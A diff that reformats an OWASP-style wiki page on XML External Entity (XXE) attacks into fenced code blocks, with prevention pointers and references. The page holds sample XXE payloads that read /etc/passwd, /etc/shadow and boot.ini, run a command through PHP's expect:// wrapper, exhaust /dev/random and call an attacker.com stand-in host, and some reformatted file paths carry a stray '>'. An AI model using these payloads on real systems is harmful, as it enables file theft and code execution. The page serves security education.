@@ -63,77 +63,76 @@ through subdomain names to a DNS server that he/she controls.
 
   - The application parses XML documents.
   - Tainted data is allowed within the system identifier portion of the
-    entity, within the [document type
-    declaration](http://www.w3.org/TR/REC-xml/#sec-prolog-dtd) (DTD).
+    entity, within the [document type declaration](http://www.w3.org/TR/REC-xml/#sec-prolog-dtd) (DTD).
   - The XML processor is configured to validate and process the DTD.
   - The XML processor is configured to resolve external entities within
     the DTD.
 
 ## Examples
 
-The examples below are from [Testing for XML Injection
-(OWASP-DV-008)](Testing_for_XML_Injection_\(OWASP-DV-008\) "wikilink").
+The examples below are from [Testing for XML Injection (OWASP-DV-008)](Testing_for_XML_Injection_\(OWASP-DV-008\) "wikilink").
 
 ### Accessing a local resource that may not return
 
-**`<?xml``   ``version="1.0"``   ``encoding="ISO-8859-1"?>`
-`<!DOCTYPE``   ``foo``   ``[` `<!ELEMENT``   ``foo``   ``ANY``   ``>`
-`<!ENTITY``   ``xxe``   ``SYSTEM``   ``"file:///dev/random"``
- ``>]><foo>&xxe;</foo>`**
+```xml
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM  "file:///dev/random" >]>
+<foo>&xxe;</foo>
+```
 
 ## Remote Code Execution
 
 If fortune is on our side, and the PHP "expect" module is loaded, we can
 get RCE. Let’s modify the payload
 
-`'''`
-
+```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
-
-'''
-
-*`'``   ``<!DOCTYPE``   ``foo``   ``[``   ``<!ELEMENT``   ``foo``
- ``ANY``   ``>`*`'`
-*`'``   ``<!ENTITY``   ``xxe``   ``SYSTEM``   ``"expect://id"``
- ``>]>`*`'`
-` `*`'``   `<creds>*`'`
-` `*`'``   `<user>`&xxe;`</user>*`'`
-` `*`'``   `<pass>`mypass`</pass>*`'`
-` `*`'``   `</creds>*`'`
+<!DOCTYPE foo
+  [<!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "expect://id" >]>
+<creds>
+  <user>`&xxe;`</user>
+  <pass>`mypass`</pass>
+</creds>
+```
 
 ### Disclosing /etc/passwd or other targeted files
 
-`''' `
-
+```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd>" >]>
+<foo>&xxe;</foo>
+```
 
-` <!DOCTYPE foo [  `
-`   <!ELEMENT foo ANY >`
-`   <!ENTITY xxe SYSTEM "`<file:///etc/passwd>`" >]>`<foo>`&xxe;`</foo>
 
-` `
-
+```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/shadow>" >]>
+<foo>&xxe;</foo>
+```
 
-` <!DOCTYPE foo [  `
-`   <!ELEMENT foo ANY >`
-`   <!ENTITY xxe SYSTEM "`<file:///etc/shadow>`" >]>`<foo>`&xxe;`</foo>
-
-` `
-
+```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
+<foo>&xxe;</foo>
+```
 
-` <!DOCTYPE foo [  `
-`   <!ELEMENT foo ANY >`
-`   <!ENTITY xxe SYSTEM "`<file:///c:/boot.ini>`" >]>`<foo>`&xxe;`</foo>
-
-` `
-
+```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]>
+<foo>&xxe;</foo>
+```
 
-` <!DOCTYPE foo [  `
-`   <!ELEMENT foo ANY >`
-`   <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]>`<foo>`&xxe;`</foo>`'''`
 
 ## Related [Attacks](Attacks "wikilink")
 
@@ -154,33 +153,19 @@ configured to use a local static DTD and disallow any declared DTD
 included in the XML document.
 
 Detailed guidance on how to disable XXE processing, or otherwise defend
-against XXE attacks is presented in the [XML External Entity (XXE)
-Prevention Cheat
-Sheet](XML_External_Entity_\(XXE\)_Prevention_Cheat_Sheet "wikilink").
+against XXE attacks is presented in the [XML External Entity (XXE) Prevention Cheat Sheet](XML_External_Entity_\(XXE\)_Prevention_Cheat_Sheet "wikilink").
 
 ## References
 
-  - OWASP [XML External Entity (XXE) Prevention Cheat
-    Sheet](XML_External_Entity_\(XXE\)_Prevention_Cheat_Sheet "wikilink")
-  - [Timothy Morgan's 2014 Paper: XML Schema, DTD, and Entity Attacks -
-    A Compendium of Known
-    Techniques](http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf)
-  - [Precursor presentation of above paper - at OWASP AppSec
-    USA 2013](http://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf)
-  - [CWE-611: Information Exposure Through XML External Entity
-    Reference](http://cwe.mitre.org/data/definitions/611.html)
-  - [CWE-827: Improper Control of Document Type
-    Definition](http://cwe.mitre.org/data/definitions/827.html)
-  - [Sascha Herzog's Presentation on XML External Entity Attacks - at
-    OWASP AppSec
-    Germany 2010](https://www.owasp.org/images/5/5d/XML_Exteral_Entity_Attack.pdf)
-  - [PostgreSQL XXE
-    vulnerability](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3489)
-  - [SharePoint and DotNetNuke XXE Vulnerabilities, in
-    French](http://www.agarri.fr/kom/archives/2011/09/15/failles_de_type_xee_dans_sharepoint_et_dotnetnuke/index.html)
-  - [XML Denial of Service Attacks and Defenses (in
-    .NET)](http://msdn.microsoft.com/en-us/magazine/ee335713.aspx)
-  - [Early (2002) BugTraq Article on
-    XXE](http://www.securityfocus.com/archive/1/297714/2002-10-27/2002-11-02/0)
+  - OWASP [XML External Entity (XXE) Prevention Cheat Sheet](XML_External_Entity_\(XXE\)_Prevention_Cheat_Sheet "wikilink")
+  - [Timothy Morgan's 2014 Paper: XML Schema, DTD, and Entity Attacks - A Compendium of Known Techniques](http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf)
+  - [Precursor presentation of above paper - at OWASP AppSec USA 2013](http://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf)
+  - [CWE-611: Information Exposure Through XML External Entity Reference](http://cwe.mitre.org/data/definitions/611.html)
+  - [CWE-827: Improper Control of Document Type Definition](http://cwe.mitre.org/data/definitions/827.html)
+  - [Sascha Herzog's Presentation on XML External Entity Attacks - at OWASP AppSec Germany 2010](https://www.owasp.org/images/5/5d/XML_Exteral_Entity_Attack.pdf)
+  - [PostgreSQL XXE vulnerability](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3489)
+  - [SharePoint and DotNetNuke XXE Vulnerabilities, in French](http://www.agarri.fr/kom/archives/2011/09/15/failles_de_type_xee_dans_sharepoint_et_dotnetnuke/index.html)
+  - [XML Denial of Service Attacks and Defenses (in .NET)](http://msdn.microsoft.com/en-us/magazine/ee335713.aspx)
+  - [Early (2002) BugTraq Article on XXE](http://www.securityfocus.com/archive/1/297714/2002-10-27/2002-11-02/0)
 
 [Category:API_Abuse](Category:API_Abuse "wikilink")
